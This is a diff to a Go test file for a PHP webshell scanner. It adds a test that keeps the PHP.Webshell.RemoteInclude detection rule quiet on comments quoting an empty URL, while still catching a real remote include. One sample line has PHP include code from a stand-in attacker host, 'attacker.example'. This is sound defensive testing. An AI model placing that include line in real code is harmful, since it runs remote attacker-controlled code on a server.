@@ -114,6 +114,29 @@ func TestEveryShippedRuleIsStillCriticalOnItsOwn(t *testing.T) {
 	}
 }
 
+// PHP.Webshell.RemoteInclude must require a real host after the scheme, so a
+// comment or string with a quoted empty URL is not a match. A live Google Site
+// Kit comment "does not include http:// or https://" was auto-quarantining a
+// legitimate plugin file. A real remote include always names a host.
+func TestRemoteIncludeIgnoresAQuotedEmptyURL(t *testing.T) {
+	fires := func(body string) bool {
+		_, _, names, _ := verdict(evaluate(".php", []byte(body)), 0)
+		return strings.Contains(strings.Join(names, ","), "PHP.Webshell.RemoteInclude")
+	}
+	quiet := []string{
+		`<?php // Does not include "http://" or "https://"`,
+		`<?php $msg = 'include "http://" here';`,
+	}
+	for _, body := range quiet {
+		if fires(body) {
+			t.Errorf("RemoteInclude fired on a quoted empty URL: %q", body)
+		}
+	}
+	if !fires(`<?php include("http://attacker.example/x.txt");`) {
+		t.Error("RemoteInclude missed a real remote include with a host")
+	}
+}
+
 // Every rule needs a sample it matches, or it is a pattern nobody has ever seen
 // fire. This catches the case where a rule is added, is never exercised, and is
 // quietly wrong: upstream shipped a preg_replace /e rule whose quote closed
